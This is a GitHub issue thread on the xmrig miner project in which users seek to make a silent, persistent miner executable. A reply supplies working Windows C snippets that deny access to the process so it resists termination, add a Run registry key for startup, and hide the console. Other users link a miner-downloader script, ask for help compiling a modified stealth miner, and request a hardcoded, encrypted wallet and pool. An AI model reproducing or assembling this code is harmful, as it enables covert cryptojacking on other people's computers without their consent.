---
title: How to make it silent,startup and persisitence?
source_url: https://github.com/xmrig/xmrig/issues/596
author: JuanMao1997
assignees: []
labels: []
created_at: '2018-05-01T09:51:24+00:00'
updated_at: '2018-11-05T13:32:46+00:00'
type: issue
status: closed
closed_at: '2018-11-05T13:32:46+00:00'
---

# Original Description
I want to make a single silent .exe file with startup and persistence features. I tested some crypter, none works. Can someone tell me which tools should I use? Thanks.

# Discussion History
## ghost | 2018-05-01T14:04:53+00:00
Process:
```
bool Process()
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	SECURITY_ATTRIBUTES sa;
	TCHAR * szSD = TEXT("D:P");

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;
	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
		return FALSE;
	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
		return FALSE;
	return TRUE;
}
```

Startup:
```
void Startup(TCHAR* path) {
	HKEY hKey = NULL;
	RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	RegSetValueEx(hKey, L"xmrig miner", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
	RegCloseKey(hKey);
}
```


Hide console:
```
#pragma comment(linker, "/subsystem:windows /ENTRY:mainCRTStartup")
```

## Gill1000 | 2018-05-02T11:42:36+00:00
guys plz dont discuss this stuff openly!!!!!!
@JuanMao1997  contact me ,,i can help you happygill1000@gmail.com or whatsapp +91 7888905540

## ghost | 2018-05-02T17:24:04+00:00
https://github.com/TheDevFromKer/miner_downloader/blob/master/install.bat - simple bat-script 
Discuss this openly - not a problem. Script-kiddy will start using what antiviruses already detect.

## BearBang7 | 2018-05-03T11:14:03+00:00
@TheDevFromKer would you please help me with compile [this project](https://github.com/RansomFuck/MODRIG) ?! I successfully create xmrig.exe using MSYS2. but no luck on MODRIG.
here is error i got.
`----
[ 65%] Building CXX object CMakeFiles/xmrig.dir/src/workers/Workers.cpp.obj
[ 67%] Building CXX object CMakeFiles/xmrig.dir/src/xmrig.cpp.obj
C:/Msys2/home/user/MODRIG/src/xmrig.cpp:12:0: warning: "STRICT" redefined
 #define STRICT

In file included from C:/Msys2/mingw64/x86_64-w64-mingw32/include/windef.h:8:0,
                 from C:/Msys2/mingw64/x86_64-w64-mingw32/include/windows.h:69,
                 from C:/Msys2/mingw64/x86_64-w64-mingw32/include/winsock2.h:23,
                 from C:/Msys2/mingw64/include/uv-win.h:32,
                 from C:/Msys2/mingw64/include/uv.h:60,
                 from C:/Msys2/home/user/MODRIG/src/App.h:3,
                 from C:/Msys2/home/user/MODRIG/src/xmrig.cpp:3:
C:/Msys2/mingw64/x86_64-w64-mingw32/include/minwindef.h:11:0: note: this is the location of the previous definition
 #define STRICT 1

C:/Msys2/home/user/MODRIG/src/xmrig.cpp:13:0: warning: ignoring #pragma comment  [-Wunknown-pragmas]
 #pragma comment(linker, "/MERGE:.data=.text")

C:/Msys2/home/user/MODRIG/src/xmrig.cpp:14:0: warning: ignoring #pragma comment  [-Wunknown-pragmas]
 #pragma comment(linker, "/MERGE:.rdata=.text")

C:/Msys2/home/user/MODRIG/src/xmrig.cpp:15:0: warning: ignoring #pragma comment  [-Wunknown-pragmas]
 #pragma comment(linker, "/SECTION:.text,EWR")

C:/Msys2/home/user/MODRIG/src/xmrig.cpp: In function 'int Copy(TCHAR*, TCHAR*, TCHAR*)':
C:/Msys2/home/user/MODRIG/src/xmrig.cpp:107:1: warning: no return statement in function returning non-void [-Wreturn-type]
 }
 ^
C:/Msys2/home/user/MODRIG/src/xmrig.cpp: In function 'int CheckMutex()':
C:/Msys2/home/user/MODRIG/src/xmrig.cpp:110:138: error: too many initializers for 'WCHAR [] {aka wchar_t []}'
  WCHAR MUTEX[] = { L"T", L"r", L"u", L"m", L"M", L"a", L"k", L"e", L"A", L"m", L"e", L"r", L"i", L"c", L"a", L"G", L"r", L"e", L"a", L"t"};
                                                                                                                                          ^
C:/Msys2/home/user/MODRIG/src/xmrig.cpp: In function 'char* WorkerID()':
C:/Msys2/home/user/MODRIG/src/xmrig.cpp:178:87: warning: passing NULL to non-pointer argument 3 of 'WINBOOL GetVolumeInformationW(LPCWSTR, LPWSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPWSTR, DWORD)' [-Wconversion-null]
  GetVolumeInformation(L"c:\\", NULL, NULL, &VolumeSerialNumber, NULL, NULL, NULL, NULL);
                                                                                       ^
C:/Msys2/home/user/MODRIG/src/xmrig.cpp:178:87: warning: passing NULL to non-pointer argument 8 of 'WINBOOL GetVolumeInformationW(LPCWSTR, LPWSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPWSTR, DWORD)' [-Wconversion-null]
C:/Msys2/home/user/MODRIG/src/xmrig.cpp:180:42: warning: format '%d' expects argument of type 'int', but argument 3 has type 'DWORD {aka long unsigned int}' [-Wformat=]
  sprintf(procID, "%d", VolumeSerialNumber);
                                          ^
C:/Msys2/home/user/MODRIG/src/xmrig.cpp:179:7: warning: address of local variable 'procID' returned [-Wreturn-local-addr]
  char procID[20];
       ^~~~~~
C:/Msys2/home/user/MODRIG/src/xmrig.cpp: In function 'int CheckPath()':
C:/Msys2/home/user/MODRIG/src/xmrig.cpp:173:1: warning: control reaches end of non-void function [-Wreturn-type]
 }
 ^
make[2]: *** [CMakeFiles/xmrig.dir/build.make:714: CMakeFiles/xmrig.dir/src/xmrig.cpp.obj] Error 1
make[1]: *** [CMakeFiles/Makefile2:68: CMakeFiles/xmrig.dir/all] Error 2
make: *** [Makefile:84: all] Error 2

` 
you can find full logs [here](https://pastebin.com/nJDD6FC7).

## ghost | 2018-05-03T12:35:06+00:00
@BearBang7 don`t use this project. Code is ugly.
Replace:
```
WCHAR MUTEX[] = { L"T", L"r", L"u", L"m", L"M", L"a", L"k", L"e", L"A", L"m", L"e", L"r", L"i", L"c", L"a", L"G", L"r", L"e", L"a", L"t"};
```
To:
```
WCHAR MUTEX[] = { L"Global\\Mutex01"};
```

## BearBang7 | 2018-05-03T12:41:30+00:00
@TheDevFromKer thank you, My problem solved.

## BearBang7 | 2018-05-03T19:20:36+00:00
@TheDevFromKer Dear Vlad can you please introduce an alternative for "MODRIG" ,Unfortunately it has some bugs. OR help me add some features like you mentioned above to "XMRIG" ?!
(hardcode and encrypt pool & wallet).

## ghost | 2018-05-03T19:27:53+00:00
@BearBang7 open issues -> https://github.com/TheDevFromKer/Panel-RIG and write what you need. But please, write so that in the end it did not turn out that I should make a virus)

## LearnMiner | 2018-05-06T16:46:01+00:00
@TheDevFromKer I copied and paste StartUp code and didnt work.. Im using win10, and i paste in configcommon.cpp


## ghost | 2018-06-01T04:03:04+00:00
guys please, where should I add the code of startup?

## trasherdk | 2018-07-26T04:41:10+00:00
What a great thread. So this is where the kiddies hang out.

"I wanna be a bad ass hacker, writing exploits, but I can't code for shit, help me please" ROFL!


## ttsite | 2018-10-23T11:38:48+00:00
> void Startup(TCHAR* path) { HKEY hKey = NULL; RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey); RegSetValueEx(hKey, L"xmrig miner", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1); RegCloseKey(hKey); }



> Process:
> 
> ```
> bool Process()
> {
> 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
> 	SECURITY_ATTRIBUTES sa;
> 	TCHAR * szSD = TEXT("D:P");
> 
> 	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
> 	sa.bInheritHandle = FALSE;
> 	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
> 		return FALSE;
> 	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
> 		return FALSE;
> 	return TRUE;
> }
> ```
> Startup:
> 
> ```
> void Startup(TCHAR* path) {
> 	HKEY hKey = NULL;
> 	RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
> 	RegSetValueEx(hKey, L"xmrig miner", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
> 	RegCloseKey(hKey);
> }
> ```
> Hide console:
> 
> ```
> #pragma comment(linker, "/subsystem:windows /ENTRY:mainCRTStartup")
> ```
I would like to ask where these codes should be added to, and try to add the startup item to the site. Thank you!


# Action History
- Created by: JuanMao1997 | 2018-05-01T09:51:24+00:00
- Closed at: 2018-11-05T13:32:46+00:00
